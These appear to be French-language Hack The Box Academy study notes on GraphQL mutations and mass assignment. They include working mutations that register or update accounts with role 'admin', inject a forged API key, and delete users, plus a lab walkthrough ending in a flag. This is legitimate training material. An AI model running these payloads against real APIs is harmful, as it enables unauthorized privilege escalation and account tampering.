---
titre: "Mutations & Escalade de Privilèges (Mass Assignment)"
aliases:
  - "Mutations & Escalade de Privilèges (Mass Assignment)"
plateforme: "Hack The Box Academy"
module: "Attacking GraphQL"
date: 2026-07-06
tags: [HTB, GraphQL, Mutations, PrivEsc, MassAssignment, Notes]
---

# 👑 Mutations & Escalade de Privilèges

Lié : [[Attacking GraphQL - Index]] · [[03 - Introspection et Information Disclosure]] · [[04 - IDOR]]

---

## 1. Qu'est-ce qu'une mutation

Les mutations sont les queries GraphQL qui **modifient** les données serveur : créer, modifier, supprimer.

```graphql
mutation {
  registerUser(input: { username: "test", password: "hash", role: "user" }) {
    user { username role }
  }
}
```

Structure en deux parties :
- **`registerUser(input: {...})`** = l'action + les données d'entrée
- **`{ user { username role } }`** = ce que tu veux que le serveur te **renvoie en confirmation** (le principe du miroir s'applique aussi aux mutations)

---

## 2. Découvrir les mutations (introspection)

```graphql
{
  __schema {
    mutationType {
      fields {
        name
        args { name type { name kind ofType { name } } }
      }
    }
  }
}
```

Puis détailler l'input type :
```graphql
{ __type(name: "RegisterUserInput") { inputFields { name type { name kind } } } }
```

→ Repérer tout champ qui touche à la sécurité : `role`, `isAdmin`, `is_active`, `verified`, `permissions`…

---

## 3. Mass Assignment — le cœur de l'exploitation

### Le problème

Un formulaire d'inscription normal ne te laisse jamais choisir ton rôle. Mais si l'input type GraphQL expose `role` → le client peut fournir cette valeur → le backend l'enregistre sans la filtrer.

### L'exploitation

1. **Introspection** : le champ `role` est dans `RegisterUserInput`.
2. On connaît les rôles existants (via `allEmployees` ou l'IDOR) : `user`, `admin`.
3. On crée un compte avec `role: "admin"` :

```graphql
mutation {
  registerUser(input: {
    username: "hasyrosAdmin",
    password: "5f4dcc3b5aa765d61d8327deb882cf99",
    role: "admin",
    msg: "Hacked!"
  }) {
    user { username role }
  }
}
```

4. Si la réponse renvoie `"role": "admin"` → le backend a accepté → **escalade réussie**.
5. Se connecter avec ce compte → accéder à `/admin` ou aux fonctionnalités réservées.

### Attention au format du mot de passe

Certains backends stockent les mots de passe en **hash MD5**. Il faut fournir le hash, pas le clair :
```bash
echo -n 'MonMotDePasse' | md5sum
# ⚠️ Le -n est CRUCIAL : sans lui, echo ajoute \n → mauvais hash → login impossible
```

---

## 4. Autres exploitations via mutations

### Modification d'objets existants

Si une mutation `updateUser` existe et accepte `role` :
```graphql
mutation {
  updateUser(input: { username: "htb-stdnt", role: "admin" }) {
    user { username role }
  }
}
```

### Création d'objets avec des données contrôlées

Si `addCustomer` accepte un `apiKey` en input :
```graphql
mutation {
  addCustomer(input: { apiKey: "ma_cle_forgee", firstName: "Test", lastName: "Test", address: "x" }) {
    customer { id }
  }
}
```
→ On peut injecter notre propre clé API ou utiliser une clé admin récupérée par over-fetching.

### Suppression

Si une mutation `deleteUser` existe → supprimer un admin pour créer un déni de service ciblé, ou supprimer un utilisateur pour prendre sa place.

---

## 5. Cas du lab (section 6)

```
1. Introspection → mutation registerUser, input: username, password, role, msg
2. Les rôles existants (via allEmployees ou IDOR) : "user" et "admin"
3. Hasher un mot de passe : echo -n 'password' | md5sum → 5f4dcc3b...
4. Mutation avec role: "admin" → réponse confirme le rôle admin
5. Login → accès à /admin → flag
```

---

## 6. Détection et réflexe

| Signal | Réflexe |
|---|---|
| Mutation `register/create/add` dans l'introspection | Introspecter l'input type → champ `role` ? |
| Champ `role`/`isAdmin` dans l'input | Fournir une valeur admin |
| Mutation `update` disponible | Modifier le rôle d'un user existant |
| Mot de passe stocké en hash (vu dans IDOR) | Fournir le hash, pas le clair |

---

## 7. Pattern transversal

Le mass assignment n'est pas spécifique à GraphQL. On le retrouve dans :
- **REST** : paramètre `role` ajouté dans un POST `/register` (même si le formulaire HTML ne l'a pas).
- **SOAP** : champ supplémentaire dans le body XML.
- **GraphQL** : l'introspection des input types **révèle** les champs exploitables, rendant la détection plus facile que sur REST.
